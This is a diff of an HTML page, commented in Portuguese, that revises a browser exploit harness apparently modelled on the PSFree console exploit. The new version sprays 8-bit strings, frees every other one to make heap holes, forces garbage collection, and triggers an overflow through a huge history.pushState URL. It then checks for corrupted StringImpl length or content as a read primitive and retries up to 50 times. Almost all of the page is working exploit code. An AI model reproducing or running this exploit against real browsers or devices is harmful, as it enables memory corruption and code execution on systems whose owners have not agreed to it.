@@ -1,132 +1,141 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PSFree Logic: StringImpl Attack 2</title>
+    <title>PSFree Logic: Persistent 8-Bit Spray</title>
     <style>
-        body { background-color: #111; color: #ff0; font-family: monospace; padding: 20px; }
-        button { font-size: 20px; padding: 15px; width: 100%; margin-bottom: 10px; cursor: pointer; }
-        #log { border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; }
+        body { background-color: #0d0d0d; color: #00ff00; font-family: monospace; padding: 20px; }
+        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #1a1a1a; color: #fff; cursor: pointer; }
+        #log { margin-top: 20px; border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
+        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; }
     </style>
 </head>
 <body>
 
-    <h1>Ataque StringImpl (Lógica Real do PSFree)</h1>
-    <p>Frameset abre o buraco -> Strings ocupam -> Overflow corrompe String.</p>
+    <h1>Ataque Persistente (Lógica PSFree Fiel)</h1>
+    <p>Usando Strings de 8-bits e Loop de Realocação.</p>
 
-    <button onclick="runAttack(0x50)">TESTE 1: Tamanho Original PSFree (80 bytes)</button>
-    <button onclick="runAttack(1024)">TESTE 2: Tamanho 1KB</button>
-    <button onclick="runAttack(1024*32)">TESTE 3: Tamanho 32KB</button>
-    <button onclick="runAttack(1024*1024)">TESTE 4: Tamanho 1MB (Large Heap)</button>
-
+    <button onclick="startPersistentAttack()">INICIAR LOOP DE ATAQUE</button>
+    
     <div id="log">Pronto. Reinicie o console.</div>
 
     <script>
-        const BASE_OFFSET = 709522;
+        const BASE_OFFSET = 709520;
         const OVERFLOW_AMT = 1024 * 64; 
 
-        var victims_fset = [];
-        var victims_str = [];
+        // Tamanho alvo: 0x50 (80 bytes) - O padrão do PSFree
+        // Se falhar, podemos tentar 128, 256, etc.
+        const TARGET_SIZE = 80; 
+        
+        // Offset do StringImpl (Header)
+        // No bundle.js é 0x18 (24 bytes).
+        const HEADER_SIZE = 24;
+        const DATA_SIZE = TARGET_SIZE - HEADER_SIZE;
 
-        function log(msg) {
+        var victims = [];
+
+        function log(msg, type) {
             const el = document.getElementById('log');
-            el.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            let style = type === 'win' ? 'class="win"' : '';
+            el.innerHTML += `<div ${style}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
             el.scrollTop = el.scrollHeight;
         }
 
-        async function runAttack(targetSize) {
-            log(`--- INICIANDO TESTE COM TAMANHO ${targetSize} ---`);
+        // Função sleep do bundle.js
+        function sleep(ms=0) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // Função gc do bundle.js (simplificada)
+        function gc() {
+            try { new Uint8Array(4 * 1024 * 1024); } catch(e){}
+        }
+
+        async function startPersistentAttack() {
+            log("Iniciando Loop Persistente...");
             
-            // 1. Preparar Framesets (Para abrir o buraco no tamanho certo)
-            // Precisamos calcular quantos elementos 'Length' (8 bytes) cabem no targetSize
-            const elementCount = targetSize / 8;
-            const rowsString = ",".repeat(elementCount - 2);
-            
-            const SPRAY_COUNT = 5000;
+            // Prepara o "Pad" (Recheio) usando a técnica de 8 bits
+            // "B".repeat(N) cria string de 1 byte por char (Latin-1)
+            const pad = "B".repeat(DATA_SIZE);
 
-            log("1. Alocando Framesets (Criando Slots)...");
-            victims_fset = [];
-            for(let i=0; i<SPRAY_COUNT; i++) {
-                let fset = document.createElement('frameset');
-                fset.rows = rowsString;
-                victims_fset.push(fset);
-            }
+            // Loop Infinito (até dar certo ou memória acabar)
+            let attempt = 0;
+            const MAX_ATTEMPTS = 50; // Tenta 50 vezes antes de desistir
 
-            // 2. Criar Buracos e IMEDIATAMENTE preencher com Strings
-            log("2. Liberando Framesets e Injetando Strings...");
-            
-            // Prepara a string de preenchimento
-            // JS Strings usam 1 ou 2 bytes. Vamos tentar criar uma string que ocupe targetSize.
-            // Se for Latin1 (1 byte), length = targetSize - header.
-            // Header do StringImpl é aprox 24 bytes (off_size_strimpl = 0x18 no bundle.js)
-            const strLen = targetSize - 24; 
-            const fillStr = "S".repeat(strLen);
+            while(attempt < MAX_ATTEMPTS) {
+                attempt++;
+                log(`--- Tentativa ${attempt} ---`);
 
-            victims_str = [];
+                // 1. SPRAY (Criar Strings)
+                victims = [];
+                for(let i=0; i<5000; i++) {
+                    // Cria uma string única mas com o tamanho exato
+                    // Usamos o índice no final para não quebrar o alinhamento do começo
+                    // A técnica do PSFree usa join('') para forçar a criação
+                    let s = [pad, i].join(""); 
+                    // Corta o excesso para manter o tamanho exato
+                    s = s.substring(0, DATA_SIZE);
+                    victims.push(s);
+                }
 
-            // Estratégia de substituição rápida
-            for(let i=0; i<SPRAY_COUNT; i+=2) {
-                // Libera o Frameset
-                victims_fset[i].rows = ""; 
-                victims_fset[i] = null;
+                // 2. BURACOS (Queijo Suíço)
+                for(let i=0; i<victims.length; i+=2) {
+                    victims[i] = null;
+                }
                 
-                // Aloca uma String no lugar (esperamos que caia no mesmo slot)
-                // Adicionamos um índice para identificar depois
-                let s = i + "_" + fillStr.substring((i+"_").length);
-                victims_str.push(s);
-            }
+                // Força GC e espera (Timing do PSFree)
+                gc();
+                await sleep(50); 
 
-            // Força um GC leve
-            await forceGC();
-
-            // 3. Overflow
-            log("3. Disparando Overflow...");
-            setTimeout(() => {
+                // 3. EXPLOIT
                 try {
                     let buffer = "A".repeat(BASE_OFFSET);
                     buffer += "\x01".repeat(OVERFLOW_AMT);
                     
+                    // Dispara
                     history.pushState({}, "pwn", "/" + buffer);
+                    
+                    // 4. CHECAGEM
+                    if (checkVictory(DATA_SIZE)) {
+                        return; // Sai do loop se vencer
+                    }
 
-                    log("4. Verificando Strings...");
-                    checkStrings(strLen);
-
-                } catch (e) {
-                    log("Erro: " + e.message);
+                } catch(e) {
+                    log("Erro crítico: " + e.message);
+                    return;
                 }
-            }, 500);
+
+                // Se falhou, limpa tudo e tenta de novo
+                victims = null;
+                gc();
+                await sleep(100);
+            }
+            
+            log("Falha após " + MAX_ATTEMPTS + " tentativas.");
         }
 
-        function checkStrings(originalLen) {
-            let success = false;
-            for(let i=0; i<victims_str.length; i++) {
-                let s = victims_str[i];
-                
-                // SINAL DE SUCESSO: O tamanho mudou?
-                // Se sobrescrevemos o cabeçalho da StringImpl, o length vira lixo (gigante)
+        function checkVictory(originalLen) {
+            for(let i=1; i<victims.length; i+=2) {
+                let s = victims[i];
+                if(!s) continue;
+
+                // Se o tamanho mudou
                 if (s.length !== originalLen) {
-                    log(`!!! SUCESSO !!! String ${i} corrompida!`, 'green');
-                    log(`Len Original: ${originalLen} | Novo: ${s.length}`);
-                    
-                    // Tenta ler para provar o acesso OOB (Out of Bounds)
-                    try {
-                        let leak = s.charCodeAt(originalLen + 100);
-                        log(`Leitura OOB (+100): ${leak}`);
-                    } catch(e) {}
-                    
-                    alert("STRINGIMPL CORRUPTED! READ PRIMITIVE READY!");
-                    success = true;
-                    break;
+                    log(`!!! SUCESSO !!! String ${i} corrompida!`, 'win');
+                    log(`Novo Tamanho: ${s.length}`);
+                    alert("RCE PRIMITIVE: STRINGIMPL CORRUPTED!");
+                    return true;
+                }
+                
+                // Se o conteúdo mudou (byte 0x01)
+                // O PSFree verifica se charCodeAt(0) mudou
+                if (s.charCodeAt(0) !== 66) { // 66 = 'B'
+                     log(`!!! SUCESSO !!! Conteúdo alterado no index ${i}`, 'win');
+                     alert("RCE PRIMITIVE: CONTENT CORRUPTED!");
+                     return true;
                 }
             }
-            if(!success) log("Nenhuma string corrompida.");
-        }
-
-        async function forceGC() {
-            try { new ArrayBuffer(10 * 1024 * 1024); } catch(e){}
-            return new Promise(r => setTimeout(r, 200));
+            return false;
         }
     </script>
 </body>
 </html>
-
-
